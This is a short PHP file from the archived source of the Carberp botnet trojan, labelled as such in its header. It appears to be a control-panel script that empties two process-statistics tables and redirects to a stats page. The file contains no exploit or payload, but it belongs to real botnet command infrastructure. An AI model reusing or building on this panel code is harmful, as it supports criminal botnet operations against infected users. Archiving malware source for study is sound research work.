/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
<?php

$mysqli->query('TRUNCATE TABLE bf_process');
$mysqli->query('TRUNCATE TABLE bf_process_stats');

header('Location: /main/stat.html');
exit;

?>